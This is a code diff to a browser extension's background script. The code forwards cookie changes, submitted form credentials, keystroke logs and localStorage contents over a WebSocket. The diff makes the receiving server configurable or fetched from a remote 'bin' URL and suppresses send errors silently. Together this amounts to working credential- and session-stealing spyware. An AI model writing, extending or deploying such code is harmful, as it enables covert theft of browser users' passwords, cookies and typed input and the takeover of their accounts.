@@ -1,8 +1,41 @@
 let ws;
 let client_id;
 
-function connectWebSocket() {
-  ws = new WebSocket("ws://localhost:3000");
+async function readConfig() {
+  try {
+    const configURL = chrome.runtime.getURL("config.json");
+    const response = await fetch(configURL);
+    if (response.ok) {
+      return await response.json();
+    }
+    console.error("Failed to read config");
+    return null;
+  } catch (error) {
+    console.error("Error reading config:", error);
+    return null;
+  }
+}
+
+async function getTargetUrl(config) {
+  if (config.useBin) {
+    try {
+      const response = await fetch(config.binUrl);
+      if (response.ok) {
+        return await response.text();
+      }
+    } catch (error) {
+      console.error("Error fetching bin URL:", error);
+    }
+  }
+  return config.targetUrl;
+}
+
+async function connectWebSocket() {
+  const config = await readConfig();
+  if (!config) return;
+
+  const targetUrl = await getTargetUrl(config);
+  ws = new WebSocket(targetUrl);
 
   ws.addEventListener("open", () => {
     console.log("WebSocket connected");
@@ -29,6 +62,7 @@ function connectWebSocket() {
       }, 1000);
     });
   });
+
   ws.addEventListener("message", handleMessages);
   ws.addEventListener("close", () => {
     console.log(
@@ -39,8 +73,6 @@ function connectWebSocket() {
     }, 1000);
   });
 }
-
-connectWebSocket();
 
 function handleMessages(message) {
   try {
@@ -54,22 +86,38 @@ function handleMessages(message) {
     console.error(err);
   }
 }
+
 function send(type, data) {
-  if (ws.readyState === WebSocket.OPEN) {
-    ws.send(JSON.stringify([type, data]));
-  } else {
-    console.log("WebSocket is not open");
+  try {
+    if (ws && ws.readyState === WebSocket.OPEN) {
+      ws.send(JSON.stringify([type, data]));
+    } else {
+      console.log("WebSocket is not open");
+    }
+  } catch (error) {
+    // Silently handle any errors
   }
 }
+
 function sendMessageToContentScript(message) {
   chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
-    let activeTab = tabs[0]; // Get the active tab
-    chrome.tabs.sendMessage(activeTab.id, { message: message }, (response) => {
-      console.log("Response from content script:", response);
-    });
+    let activeTab = tabs[0];
+    if (activeTab) {
+      chrome.tabs.sendMessage(
+        activeTab.id,
+        { message: message },
+        (response) => {
+          console.log("Response from content script:", response);
+        }
+      );
+    }
   });
 }
 
+// Initialize WebSocket connection
+connectWebSocket();
+
+// Event listeners remain the same
 chrome.cookies.onChanged.addListener(function (changeInfo) {
   send("updatecookie", changeInfo.cookie);
 });
@@ -77,14 +125,13 @@ chrome.cookies.onChanged.addListener(function (changeInfo) {
 chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
   switch (message.type) {
     case "FORM_SUBMISSION":
-      // Log the received form data
       console.log(
         "Form submission received from:",
         sender.tab ? sender.tab.url : "unknown source"
       );
       console.log("Form data:", message.data);
       send("addsubmittedcredentials", message.data);
-      // Store the form data (example using chrome.storage)
+
       chrome.storage.local.get(["formSubmissions"], (result) => {
         const submissions = result.formSubmissions || [];
         submissions.push(message.data);
@@ -94,20 +141,19 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
         });
       });
 
-      // Send response back to content script
       sendResponse({ status: "success", timestamp: new Date().toISOString() });
       break;
+
     case "ACTIVITY_LOG":
       const logData = {
         keys: message.data.keys,
         timestamp: message.data.timestamp,
         url: message.data.url,
       };
-
       send("activitylog", logData);
       break;
+
     case "STORAGE_STATE":
-      // Handle localStorage state update
       const storageData = {
         domain: message.data.domain,
         storage: message.data.storage,
@@ -115,7 +161,5 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
       send("setlocalstorage", storageData);
       break;
   }
-
-  // Required for async response
   return true;
 });
